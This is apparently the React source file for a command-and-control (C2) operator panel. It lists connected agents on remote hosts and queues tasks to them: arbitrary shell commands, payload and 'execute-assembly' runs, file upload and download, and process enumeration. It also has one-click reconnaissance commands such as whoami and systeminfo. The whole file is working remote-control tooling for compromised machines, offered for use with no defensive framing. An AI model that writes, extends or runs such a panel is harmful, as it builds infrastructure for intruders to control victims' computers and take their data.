import {
  useEffect,
  useRef,
  useState,
  useCallback,
} from 'react'

import { api } from './api'

import type {
  Agent,
  ProcessInfo,
  ProcessNode,
  Result,
  TaskType,
} from './types'

const TASK_TYPES: {
  value: TaskType
  label: string
}[] = [
  { value: 'shell', label: 'Shell Command' },
  { value: 'process', label: 'Process Tree' },
  { value: 'payload', label: 'Payload' },
  { value: 'execute-assembly', label: 'Execute Assembly' },
  { value: 'download', label: 'Download File' },
  { value: 'upload', label: 'Upload File' },
  { value: 'sleep', label: 'Sleep' },
]

const QUICK = [
  'whoami',
  'hostname',
  'ipconfig',
  'systeminfo',
  'dir',
  'tasklist',
]

function timeAgo(iso: string): string {
  if (!iso) return '—'

  const s = Math.floor(
    (Date.now() - new Date(iso).getTime()) / 1000,
  )

  if (s < 5) return 'now'
  if (s < 60) return `${s}s ago`
  if (s < 3600) return `${Math.floor(s / 60)}m ago`

  return `${Math.floor(s / 3600)}h ago`
}

function buildProcessTree(
  processes: ProcessInfo[],
): ProcessNode[] {
  const nodes = new Map<number, ProcessNode>()

  for (const process of processes) {
    nodes.set(process.pid, {
      ...process,
      children: [],
    })
  }

  const roots: ProcessNode[] = []

  for (const node of nodes.values()) {
    const parent = nodes.get(node.ppid)

    if (parent && parent.pid !== node.pid) {
      parent.children.push(node)
    } else {
      roots.push(node)
    }
  }

  const sortTree = (items: ProcessNode[]) => {
    items.sort((a, b) =>
      a.name.localeCompare(b.name),
    )

    for (const item of items) {
      sortTree(item.children)
    }
  }

  sortTree(roots)

  return roots
}

function parseProcessOutput(
  output: string,
): ProcessNode[] | null {
  try {
    const parsed = JSON.parse(output)

    if (!Array.isArray(parsed)) {
      return null
    }

    const processes: ProcessInfo[] = parsed
      .map((item): ProcessInfo | null => {
        const pid = Number(
          item.ProcessId ?? item.pid,
        )

        const ppid = Number(
          item.ParentProcessId ?? item.ppid,
        )

        const name = String(
          item.Name ?? item.name ?? 'unknown',
        )

        if (!Number.isFinite(pid)) {
          return null
        }

        return {
          pid,
          ppid: Number.isFinite(ppid)
            ? ppid
            : 0,
          name,
        }
      })
      .filter(
        (item): item is ProcessInfo =>
          item !== null,
      )

    return buildProcessTree(processes)
  } catch {
    return null
  }
}

function ProcessTree({
  nodes,
}: {
  nodes: ProcessNode[]
}) {
  const [expanded, setExpanded] =
    useState<Set<number>>(
      () => new Set(),
    )

  useEffect(() => {
    const initial = new Set<number>()

    for (const node of nodes) {
      initial.add(node.pid)
    }

    setExpanded(initial)
  }, [nodes])

  function toggle(pid: number) {
    setExpanded((current) => {
      const next = new Set(current)

      if (next.has(pid)) {
        next.delete(pid)
      } else {
        next.add(pid)
      }

      return next
    })
  }

  function renderNode(
    node: ProcessNode,
    depth: number,
  ): React.ReactNode {
    const hasChildren =
      node.children.length > 0

    const isExpanded =
      expanded.has(node.pid)

    return (
      <div
        key={`${node.pid}-${node.ppid}`}
        style={{
          marginLeft: depth * 20,
        }}
      >
        <div
          className="process-row"
          onClick={() => {
            if (hasChildren) {
              toggle(node.pid)
            }
          }}
          style={{
            cursor: hasChildren
              ? 'pointer'
              : 'default',
          }}
        >
          <span className="process-arrow">
            {hasChildren
              ? isExpanded
                ? '▼'
                : '▶'
              : '•'}
          </span>

          <span className="process-name">
            {node.name}
          </span>

          <span className="process-pid">
            PID {node.pid}
          </span>
        </div>

        {hasChildren &&
          isExpanded &&
          node.children.map((child) =>
            renderNode(
              child,
              depth + 1,
            ),
          )}
      </div>
    )
  }

  return (
    <div className="process-tree">
      {nodes.map((node) =>
        renderNode(node, 0),
      )}
    </div>
  )
}

export default function App() {
  const [agents, setAgents] =
    useState<Agent[]>([])

  const [selected, setSelected] =
    useState<string | null>(null)

  const [results, setResults] =
    useState<Result[]>([])

  const [taskType, setTaskType] =
    useState<TaskType>('shell')

  const [command, setCommand] =
    useState('')

  const [payloadId, setPayloadId] =
    useState('')

  const [online, setOnline] =
    useState(false)

  const [sending, setSending] =
    useState(false)

  const [toast, setToast] =
    useState<string | null>(null)

  const consoleRef =
    useRef<HTMLDivElement>(null)

  const loadAgents = useCallback(
    async () => {
      try {
        setAgents(
          await api.agents(),
        )

        setOnline(true)
      } catch {
        setOnline(false)
      }
    },
    [],
  )

  const loadResults =
    useCallback(
      async (id: string | null) => {
        if (!id) return

        try {
          setResults(
            await api.results(id),
          )
        } catch {
          // ignore polling errors
        }
      },
      [],
    )

  useEffect(() => {
    loadAgents()

    const timer =
      setInterval(
        loadAgents,
        3000,
      )

    return () =>
      clearInterval(timer)
  }, [loadAgents])

  useEffect(() => {
    loadResults(selected)

    const timer =
      setInterval(
        () =>
          loadResults(selected),
        3000,
      )

    return () =>
      clearInterval(timer)
  }, [
    selected,
    loadResults,
  ])

  useEffect(() => {
    if (
      selected &&
      !agents.some(
        (a) =>
          a.id === selected,
      )
    ) {
      setSelected(null)
    }
  }, [
    agents,
    selected,
  ])

  /*
   * فقط وقتی کاربر نزدیک انتهای console است
   * scroll انجام می‌دهیم.
   */
  useEffect(() => {
    const el =
      consoleRef.current

    if (!el) return

    const threshold = 80

    const nearBottom =
      el.scrollHeight -
        el.scrollTop -
        el.clientHeight <
      threshold

    if (nearBottom) {
      el.scrollTop =
        el.scrollHeight
    }
  }, [results])

  function showToast(
    message: string,
  ) {
    setToast(message)

    setTimeout(
      () => setToast(null),
      2000,
    )
  }

  function resetInputs() {
    setCommand('')
    setPayloadId('')
  }

  function buildTask() {
    if (taskType === 'shell') {
      if (!command.trim()) {
        return null
      }

      return {
        type: 'shell' as const,
        command:
          command.trim(),
      }
    }

    if (taskType === 'payload') {
      if (!payloadId.trim()) {
        return null
      }

      return {
        type: 'payload' as const,
        payload_id:
          payloadId.trim(),
      }
    }

    if (
      taskType ===
      'execute-assembly'
    ) {
      if (!payloadId.trim()) {
        return null
      }

      return {
        type:
          'execute_assembly' as const,
        payload_id:
          payloadId.trim(),
      }
    }

    if (
      taskType === 'download' ||
      taskType === 'upload'
    ) {
      if (!payloadId.trim()) {
        return null
      }

      return {
        type:
          taskType ===
          'download'
            ? 'file_download'
            : 'file_upload',
        payload_id:
          payloadId.trim(),
      }
    }

    return {
      type: taskType,
    }
  }

  async function sendTask() {
    if (!selected) return

    const task =
      buildTask()

    if (!task) {
      showToast(
        taskType ===
          'shell'
          ? 'enter a command'
          : 'enter a payload id',
      )

      return
    }

    setSending(true)

    try {
      await api.queue(
        selected,
        task,
      )

      resetInputs()

      showToast(
        `${taskType} task queued`,
      )
    } catch (e) {
      showToast(
        `error: ${
          e instanceof Error
            ? e.message
            : 'unknown'
        }`,
      )
    } finally {
      setSending(false)
    }
  }

  const agent =
    agents.find(
      (a) =>
        a.id === selected,
    )

  const isShell =
    taskType === 'shell'

  const isPayload =
    taskType === 'payload' ||
    taskType ===
      'execute-assembly' ||
    taskType === 'download' ||
    taskType === 'upload'

  return (
    <div className="app">
      <header>
        <div className="brand">
          C2 PANEL
        </div>

        <div
          className={`status ${
            online
              ? 'on'
              : 'off'
          }`}
        >
          <span className="dot" />

          {online
            ? 'connected'
            : 'disconnected'}
        </div>
      </header>

      <main>
        <aside>
          <h2>
            Agents ({agents.length})
          </h2>

          <div className="agent-list">
            {agents.length ===
              0 && (
              <div className="empty">
                no agents registered
              </div>
            )}

            {agents.map(
              (a) => (
                <div
                  key={a.id}
                  className={`agent ${
                    a.id ===
                    selected
                      ? 'active'
                      : ''
                  }`}
                  onClick={() =>
                    setSelected(
                      a.id,
                    )
                  }
                >
                  <div className="agent-top">
                    <span className="agent-user">
                      {
                        a
                          .info
                          .user
                      }
                      @
                      {
                        a
                          .info
                          .host
                      }
                    </span>

                    <span className="agent-id">
                      {a.id.slice(
                        0,
                        8,
                      )}
                    </span>
                  </div>

                  <div className="agent-meta">
                    <span>
                      {
                        a
                          .info
                          .os
                      }
                    </span>

                    <span className="lastseen">
                      {timeAgo(
                        a.last_seen,
                      )}
                    </span>
                  </div>
                </div>
              ),
            )}
          </div>
        </aside>

        <section className="workspace">
          {!selected ? (
            <div className="placeholder">
              Select an agent to open
              its console
            </div>
          ) : (
            <>
              <div className="console-head">
                <span className="target">
                  {
                    agent?.info
                      .user
                  }
                  @
                  {
                    agent?.info
                      .host
                  }
                </span>

                <span className="target-id">
                  {selected}
                </span>
              </div>

              <div
                className="console"
                ref={consoleRef}
              >
                {results.length ===
                  0 && (
                  <div className="console-empty">
                    no results yet —
                    queue a task below
                  </div>
                )}

                {results.map(
                  (r) => {
                    const tree =
                      parseProcessOutput(
                        r.output,
                      )

                    const isProcessResult =
                      taskType ===
                        'process' ||
                      r.command ===
                        'process tree'

                    return (
                      <div
                        key={r.id}
                        className="entry"
                      >
                        <div className="cmdline">
                          <span className="prompt">
                            ›
                          </span>{' '}

                          {r.command ||
                            '(no command)'}

                          <span className="time">
                            {new Date(
                              r.created_at,
                            ).toLocaleTimeString()}
                          </span>
                        </div>

                        {isProcessResult &&
                        tree ? (
                          <ProcessTree
                            nodes={tree}
                          />
                        ) : r.output ? (
                          <pre className="output">
                            {
                              r.output
                            }
                          </pre>
                        ) : (
                          <div className="running">
                            executing…
                          </div>
                        )}
                      </div>
                    )
                  },
                )}
              </div>

              {isShell && (
                <div className="quick">
                  {QUICK.map(
                    (q) => (
                      <button
                        key={q}
                        onClick={() =>
                          setCommand(
                            q,
                          )
                        }
                      >
                        {q}
                      </button>
                    ),
                  )}
                </div>
              )}

              <div className="task-panel">
                <div className="task-type">
                  <label>
                    Task Type
                  </label>

                  <select
                    value={
                      taskType
                    }
                    onChange={(
                      e,
                    ) => {
                      setTaskType(
                        e.target
                          .value as TaskType,
                      )

                      resetInputs()
                    }}
                  >
                    {TASK_TYPES.map(
                      (
                        type,
                      ) => (
                        <option
                          key={
                            type.value
                          }
                          value={
                            type.value
                          }
                        >
                          {
                            type.label
                          }
                        </option>
                      ),
                    )}
                  </select>
                </div>

                {isShell && (
                  <form
                    className="composer"
                    onSubmit={(
                      e,
                    ) => {
                      e.preventDefault()
                      sendTask()
                    }}
                  >
                    <span className="prompt">
                      ›
                    </span>

                    <input
                      value={
                        command
                      }
                      onChange={(
                        e,
                      ) =>
                        setCommand(
                          e.target
                            .value,
                        )
                      }
                      placeholder="command to execute..."
                    />

                    <button
                      type="submit"
                      disabled={
                        sending ||
                        !command.trim()
                      }
                    >
                      {sending
                        ? '...'
                        : 'Send'}
                    </button>
                  </form>
                )}

                {isPayload && (
                  <form
                    className="composer"
                    onSubmit={(
                      e,
                    ) => {
                      e.preventDefault()
                      sendTask()
                    }}
                  >
                    <span className="prompt">
                      #
                    </span>

                    <input
                      value={
                        payloadId
                      }
                      onChange={(
                        e,
                      ) =>
                        setPayloadId(
                          e.target
                            .value,
                        )
                      }
                      placeholder="payload id..."
                    />

                    <button
                      type="submit"
                      disabled={
                        sending ||
                        !payloadId.trim()
                      }
                    >
                      {sending
                        ? '...'
                        : 'Send'}
                    </button>
                  </form>
                )}

                {taskType ===
                  'process' && (
                  <div className="placeholder-task">
                    <div>
                      Enumerates processes
                      and displays
                      parent/child
                      relationships.
                    </div>

                    <button
                      onClick={
                        sendTask
                      }
                      disabled={
                        sending
                      }
                    >
                      {sending
                        ? '...'
                        : 'Get Process Tree'}
                    </button>
                  </div>
                )}

                {taskType ===
                  'sleep' && (
                  <div className="placeholder-task">
                    <div>
                      Sleep task
                    </div>

                    <button
                      onClick={
                        sendTask
                      }
                      disabled={
                        sending
                      }
                    >
                      {sending
                        ? '...'
                        : 'Queue Sleep'}
                    </button>
                  </div>
                )}
              </div>
            </>
          )}
        </section>
      </main>

      {toast && (
        <div className="toast">
          {toast}
        </div>
      )}
    </div>
  )
}